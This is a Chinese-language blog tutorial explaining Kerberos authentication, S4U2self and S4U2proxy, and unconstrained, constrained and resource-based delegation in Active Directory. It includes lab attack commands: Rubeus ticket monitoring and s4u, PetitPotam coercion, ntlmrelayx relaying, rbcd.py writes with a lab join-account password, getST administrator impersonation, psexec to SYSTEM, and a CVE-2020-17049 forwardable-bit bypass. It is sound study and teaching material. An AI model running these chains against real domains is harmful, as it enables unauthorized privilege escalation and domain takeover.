# Delegation

本文记录学习Kerberos认证和委派相关的知识和攻击手法，由于原理很复杂，所以不敢保证自己能讲明白。尽力😥。

注： **本文中 TGS = 服务票据ST**

## Kerberos

### 简介

Kerberos是一种由MIT（麻省理工大学）提出的一种网络身份验证协议。它旨在通过使用密钥加密技术为客户端/服务器应用程序提供强身份验证。

在Kerberos协议中主要是有三个角色的存在：

1. 提供服务的`Server`(如`HTTP`服务，`MSSQL`服务等)
2. `KDC`（`Key Distribution Center`）密钥分发中心，默认安装在域控（Domain Controller）中。KDC包含下面三个角色
    * `Authentication Service`: 为client生成TGT的服务
    * `Ticket Granting Service`: 为client生成某个服务的TGS（ticket）
    * `Account Database`:一个类似于本机SAM的一个数据库。存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT。
3. `PAC `(`Privileged Attribute Certificate`) 特权属性证书保护 功能，PAC主要是规定服务器将票据发送给kerberos服务，由 kerberos服务验证票据是否有效。

### 认证流程

参考自[daiker](https://daiker.gitbook.io/windows-protocol/kerberos/1)、[倾旋](https://payloads.online/archivers/2018-11-30/1/)、 [JD.Army](https://jd.army/2021/11/04/kerberos%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E9%9D%A2/#/windows%E4%B8%AD%E7%9A%84kerberos)

<img src="https://s2.loli.net/2022/03/06/fesWOVS3ldY2Hiq.png" alt="image-20220306215916595" style="zoom:200%;" />

1. AS_REQ: Client向KDC发起AS_REQ,请求凭据包含用户名，用户的`NTLM Hash`加密的时间戳，到期时间等信息。
2. AS_REP: KDC根据用户名在`Accout Database`中查找用户对应的`NTLM Hash`进行解密，如果结果正确则第一步认证通过。随后KDC生成随机字符串`Session Key`，使用用户`NTLM Hash`加密`Session Key`作为AS_REP返回，同时返回用`krbtgt hash`加密的TGT票据，TGT里面包含PAC,PAC包含Client的sid，Client所在的组以及`Session Key`。
3. TGS_REQ: Client凭借TGT票据与使用自己`NTLM Hash`解密出来的`Session Key`加密的客户端信息跟时间戳。向KDC发起针对特定服务的TGS_REQ请求。
4. TGS_REP: KDC使用`krbtgt hash`对TGT进行解密得到`Session Key`，再使用`Session Key`解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信，如果结果正确，就会生成一个新的`Session Key`，我们称之为`Server Session Key`，这个`Server Session Key`主要用于和服务器进行通信。返回信息包括`Session Key`加密的`Server Session Key`和用`Server Hash`加密PAC、`Server Session Key`和客户端信息的ST票据（`ticket`）(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回ST票据)
5. AP_REQ: Client拿着ST票据（包含PAC）和`Server Session Key`加密的客户端信息与时间戳去请求服务。
6. AP_REP: 服务使用自己的hash解密ST票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限。

### 图解

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220223205141-dn0o0qe.png)

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220223205153-n3zsfhl.png)

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220223205201-ulzs2bv.png)

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220223205215-5hp340y.png)

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220223205227-spw6h6f.png)


## S4U扩展协议

包括s4u2self和s4u2proxy。

### s4u2self

他其实是一次TGS认证的阶段。服务A代替用户请求一张针对服务A本身的服务票据ST。生成的服务票据是可转发的。从而用于后面的s4u2proxy认证阶段。![image.png](https://s2.loli.net/2022/03/06/YIaxKG6XuQA1nNP.png)

之所以有这个阶段，是为了兼容其他不通过Kerberos认证的登录方式，比如用户通过SSO统一登录、或者通过NTLM认证。这是一个协议转换的过程。

服务代表用户获得针对服务自身的kerberos票据这个过程，服务是不需要用户的凭据的。

获取**可转发票据**的前提：

1. 机器被配置了约束性委派

    ![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220223150301-rewswqi.png)
2. 用户没有设置 敏感账户，不能被委派

    ![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220220222412-fcm5798.png)
3. 用户不是受保护用户组的成员


即使机器没有被配置约束委派，也就是用户的`UserAccountControl`位没有`TrustedToAuthForDelegation` 属性。

s4u2self依然可以请求到服务票据，只不过这个服务票据不可转发。这种情况适用于基于资源的约束委派RBCD。


### s4u2proxy

服务A拿着s4u2self阶段请求的服务票据ST去请求另一个服务B的服务票据。

S4U2Proxy 总是产生一个可转发的 TGS，即使请求中提供的额外 TGS 是不可转发的。

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220222144018-5r1j7no.png "https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html")

> 有个点需要注意的是，前面在S4U2SELF里面提到，在满足一定的条件之后，S4U2SELF返回的票据是可以转发的，这个票据作为S4U2PROXY的AddtionTicket，有些文章里面会说，S4U2PROXY要求AddtionTicket里面的票据一定要是可转发的，否则S4U2PROXY生成的票据是不可以转发的。这个说法在引入可资源约束委派的情况下，是不成立的。（[TGS_REQ & TGS_REP - windows protocol](https://daiker.gitbook.io/windows-protocol/kerberos/2#0x04-s4u2proxy)）
>


## 非约束委派

### 介绍

`Windows 2000`引进非约束委派。

配置非约束委派需要`SeEnableDelegation`权限。这个权限通常只授予域管理员。

被配置了非约束性委派的机器。其他用户（比如说域管）访问这台机器时，会携带该用户的TGT。并将TGT缓存进非约束委派机器lsass内存中。如下图，

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220222141549-62ntywc.png)

正常未被配置委派的机器lsass内存中只有服务票据ST。

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220222141646-n9npho6.png)

### 利用

配置了非约束委派的用户的`userAccountControl`属性有个FLAG位`TrustedForDelegation`。

```bash
查询非约束委派用户
AdFind.exe -b "DC=adc,DC=com" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName
查询非约束委派机器
AdFind.exe -b "DC=adc,DC=com" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName

```

由于用户访问非约束委派主机会自动留下自己的TGT，所以利用思路一般是：

1. 诱导域管访问该主机。从而获取域管TGT。
2. 结合打印机bug或者Petitpotam强制域内机器访问该主机。

第二种方法有一个经典攻击场景：**跨域**

因为域控默认是非约束委派。且父域和子域之间默认是双向信任关系。所以当我们拿下一台子域控后。可以通过PetitPotam强制父域控访问子域控从而获得父域控机器账户TGT。然后进行dcsync父域。

需要注意一个细节的是使用打印机bug或者Petitpotam时要使用host不要用ip。否则会失败。

```bash
Rubeus监听
.\Rubeus.exe monitor /interval:1 /filteruser:DC01$

python3 PetitPotam.py WEB2 10.10.10.10

PTT然后dcsync
```

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220304210713-rld7916.png)

## 约束性委派

### 介绍

`Windows 2003`引入了约束性委派

配置约束性委派也需要`SeEnableDelegation`权限。

> 具体过程是收到用户的请求之后，首先代表用户获得针对服务自身的可转发的kerberos服务票据(S4U2SELF)，拿着这个票据向KDC请求访问特定服务的可转发的TGS(S4U2PROXY)，并且代表用户访问特定服务，而且只能访问该特定服务。
>
> 相较于非约束委派，约束委派最大的区别也就是配置的时候选择某个特定的服务，而不是所有服务。
>

参照下图，serviceA在S4U2proxy阶段需要一张用户的TGS（服务票据ST），这个TGS可以是serviceA通过s4u2self得到，也可以是用户直接访问serviceA得到。

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220222143558-i005acb.png "https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html")


### 利用

配置了约束委派的用户的`userAccountControl`属性有个FLAG位`TrustedToAuthForDelegation`。

并且还有个`msDS-AllowedToDelegateTo`属性，他的值是允许访问的服务。也就是配置约束委派我们指定的特定服务。

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220222145215-owaph6m.png)

```bash
查询约束性委派用户
AdFind.exe -b "DC=adc,DC=com" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
查询约束性委派机器
AdFind.exe -b "DC=adc,DC=com" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto

```

拿下一个约束委派主机后，我们就可以模拟任意用户访问该主机允许的服务（msDS-AllowedToDelegateTo）。感觉这部分和RBCD有些重复，不再演示。重点在RBCD。

## 基于资源的约束性委派

### 介绍

基于资源的约束性委派又名RBCD。

配置约束性委派和非约束性委派都需要`SeEnableDelegation`权限。而这个权限一般只有域管才有。为了赋予用户更大的灵活性，微软在`Windows server 2012`中引进基于资源的约束性委派。

> 基于资源的约束委派只能在运行Windows Server 2012 R2和Windows Server 2012的域控制器上配置，但可以在混合模式林中应用。
>

* 配置基于资源的约束性委派，无需`SeEnableDelegation`权限，**只需要对机器具有写属性权限（WriteProperty）。即可配置。**
* `msDS-AllowedToDelegateTo` 变成了 `msDS-AllowedToActOnBehalfOfOtherIdentity`。但是方向相反。参照下图。

也就是说，serviceB上配置`msDS-AllowedToActOnBehalfOfOtherIdentity`的值为serviceA。那么serviceB就信任来自serviceA的委派。也就是下图的**传出信任**与**传入信任**。

![image.png](https://s2.loli.net/2022/03/06/GFUn6SvYDVRgyXC.png "https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html")

> 服务A代表用户申请一个获得针对服务A自身的kerberos服务票据、这一步就是S4U2SELF，这一步就区别传统的约束委派，在S4U2SELF里面提到，**返回的TGS可转发的一个条件是服务A配置了传统的约束委派，kdc会检查服务A 的TrustedToAuthForDelegation位和msDS-AllowedToDelegateTo 这个字段**，**由于基于资源的约束委派，是在服务B配置，服务B的msDS-AllowedToActOnBehalfOfOtherIdentity属性配置了服务A的sid**，服务A并没有配置TrustedToAuthForDelegation位和msDS-AllowedToDelegateTo 字段。因此这一步返回的TGS票据是不可转发的。
>
> （[TGS_REQ & TGS_REP - windows protocol](https://daiker.gitbook.io/windows-protocol/kerberos/2#3.-ji-yu-zi-yuan-de-yue-shu-wei-pai)）
>

**也就是说传统的约束性委派在s4u2proxy阶段需要可转发的TGS。但是RBCD的不需要。**

### 常规利用

#### Relay

```bash
自动创建一个机器账户，密码随机。需要ldaps。
python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug --remove-mic --delegate-access  -smb2support
指定机器账户
python3 ntlmrelayx.py -t ldap://10.10.10.10 -debug --remove-mic --delegate-access --escalate-user testpc\$ 
```

![image.png](https://s2.loli.net/2022/03/06/YHO792xnlfg4RjS.png)

```bash
python3 getST.py -impersonate 'administrator' -spn 'cifs/WEB2.adc.com'  -dc-ip 10.10.10.10 'adc.com/USCJNQTK\$:'
export KRB5CCNAME=administrator.ccache
python3 psexec.py -no-pass -k 'adc.com/administrator@web2.adc.com'
```

![image.png](https://s2.loli.net/2022/03/06/KMP5qg6jDSIQE34.png)

```bash
计算hash
.\Rubeus.exe hash /domain:adc.com /user:USCJNQTK$ /password:"iJ'vp3V>'4De}tf"
请求st
.\Rubeus.exe s4u /user:USCJNQTK$ /aes256:64033274241a7f086ce4254fc8a46072810c021013a546c807bad5421d33f7b6 /impersonateuser:Administrator /msdsspn:host/web2.adc.com /altservice:cifs /domain:adc.com /nowrap /ptt

.\Rubeus.exe s4u /user:USCJNQTK$ /aes256:64033274241a7f086ce4254fc8a46072810c021013a546c807bad5421d33f7b6 /impersonateuser:Administrator /msdsspn:host/web2.adc.com /altservice:cifs /domain:adc.com /nowrap /ptt

```

![image.png](https://s2.loli.net/2022/03/06/UYEvTO8gGwkHaJK.png)

#### 加域账户

> 当一个用户给一台机器加域后，该用户就对该机器具有写属性权限（WriteProperty）。而企业中往往都会有一个专门的加域用户，当我们拿到了这个加域用户的凭据后，我们就可以通过RBCD控制由该用户加入域内所有机器的权限。
>

首先假设我们抓到了加域账户（`join`）的哈希或密码。

```bash
python3 rbcd.py -delegate-to 'web2' -action read 'adc.com/join:song@2020' -dc-ip 10.10.10.10
python3 rbcd.py -delegate-to 'web2' -delegate-from USCJNQTK  -action write 'adc.com/join:song@2020' -dc-ip 10.10.10.10
python3 rbcd.py -delegate-to 'web2' -action read 'adc.com/join:song@2020' -dc-ip 10.10.10.10
python3 getST.py -impersonate 'administrator' -spn 'cifs/WEB2.adc.com'  -dc-ip 10.10.10.10 'adc.com/USCJNQTK\$:'

```

![image.png](https://s2.loli.net/2022/03/06/ZmfG1ok8H2IUVzN.png)


导入票据后使用psexec等工具即可获得该机器的SYSTEM权限。这也是一种提权的过程。（join账户 -> SYSTEM）。

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220225144943-5zxydy4.png)

同样，域内`Accout Operators` 组的成员对域内机器有写属性权限。假设我们拿到的机器登录的用户是`Accout Operators` 组的成员。同样可以通过RBCD的方式拿到该机器的SYSTEM权限。

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220225144354-1dong18.png)

**RBCD提权方式有很多，下篇文章专门讲解**。


## 其他攻击面

### 变种黄金票据

这里也很好理解。我们通过s4u2self代表域管administrator申请一张访问自身的服务票据TGS。再拿着这张TGS通过s4u2proxy去访问服务krbtgt/adc.com。那么这张票据不就是域管的TGT吗。

类似这样的结构：![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220225153356-2ta9g0r.png)

这种手法通过约束委派或者RBCD都可以实现。

我们修改一个配置约束委派机器的msDS-AllowedToDelegateTo属性为krbtgt/adc.com。

或者设置krbtgt的msDS-AllowedToActOnBehalfOfOtherIdentity属性为我们添加的机器。

再通过S4U协议即可获得一张域管的TGT。

具体参考：

[利用 Kerberos delegation 打造变种黄金票据](https://paper.seebug.org/620/)

### CVE-2020-17049

在s4u2self阶段我们提到，获取可转发的票据，需要

1. 机器配置了约束委派
2. 用户没有设置 '敏感账户，不能被委派'
3. 用户不是受保护组的成员

我们给administrator配置敏感账户。

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220225162934-c87dk79.png)

在s4u2proxy阶段申请服务票据时报错。

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220225162957-5ddtyva.png)

加上-force-forwardable成功。

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220225165918-hmhk3bz.png)

为什么呢？

票据中的forwardable位标志着该票据是否可转发。我们看一下KDC验证forwardable的流程：

**s4u2self阶段**：KDC会检查机器是否配置委派、敏感用户和是否是受保护组成员

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220225190133-cng1sj5.png)

不满足上述条件forwardable位就被设为0。而s4u2self阶段的的forwardable位是通过server本身的hash加密的，这就导致了我们可以解密并把forwardable位改为1。这样后续s4u2proxy校验KDC就认为委派的用户不受保护。

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220303150037-4cut8ol.png)

那么这里就有一个问题。我们知道RBCD时s4u2self阶段申请的票据不一定是可转发的。而且多数情况下是不可转发的。那么s4u2proxy阶段KDC的验证顺序是怎么样的呢。

Rubeus有专门得s4u模块

[GhostPack/Rubeus: Trying to tame the three-headed dog. (github.com)](https://github.com/GhostPack/Rubeus#s4u)

> 以下是我个人测试结果，不一定对：
>

s4u2proxy阶段：

forwardable = 1：

   KDC首先确定两者是否存在委派关系(首先检查是否存在A->B的约束委派，不存在则检查是否存在B->A的RBCD)。若不存在委派关系，报错返回。


forwardable = 0：

   首先检查是否存在B->A的RBCD，如果二者存在RBCD，会进一步检查用户是否配置了不可委派或者是受保护组的,若不是s4u2proxy依然可用。

这里根据我本地的测试结果。KDC检查用户是否配置了不可委派时是在TGS-REQ请求中的PAC中检查的。

这也就是说以下攻击顺序是可行的：

1. s4u2self申请administrator的TGS。

2. 设置administrator为委派账户不可委派。

3. 使用上面申请的TGS进行s4u2proxy。

4. 成功获取票据。

**瞎折腾了半天，感觉也没啥实际价值。**


### s4u2self提权

假设我们拿到一台机器权限是一些服务账户的，比如`NT AUTHORITY\NETWORK SERVICE`、`iis apppool\defaultapppool`   `nt service\mssqlserver`这类权限在访问网络资源时是通过机器账户去访问的。

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220306200425-kahd712.png)

而任意机器账户都已进行s4u2self获得一张任意用户访问自身的服务票据。即使这张票据不可转发、该用户在受保护组中，票据依然可用。

示例：

首先我们上线了一台mssql的机器，权限是mssqlservice。

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220306190949-vgzz8cy.png)

执行s4u2self之前，我们需要一张机器账户的TGT或者hash。

[Rubeus - 现在拥有更多的Kekeo功能 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/162606#h2-2)

通过Rubeus的tgtdeleg功能获取一张机器账户的TGT。

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220306191228-94t1h8d.png)

然后通过s4u2self代替域管获取mssql的服务票据

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220306191306-rxgacqn.png)

然后转换票据，票据传递。获得system权限。

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image@latest/blog/image-20220306191804-0aceqvu.png)


与白银银票相比，它的优势在于生成的票据包含有效的 PAC。

## 参考

[revisiting-delegate-2-thyself](https://exploit.ph/revisiting-delegate-2-thyself.html)

[Abusing Kerberos S4U2self for local privilege escalation ](https://cyberstoph.org/posts/2021/06/abusing-kerberos-s4u2self-for-local-privilege-escalation/)

[windows protocol](https://daiker.gitbook.io/windows-protocol/kerberos/2#0x03-s4u2self)

[Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)

[微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato） - 奇安信A-TEAM技术博客 (qianxin.com)](https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie/)


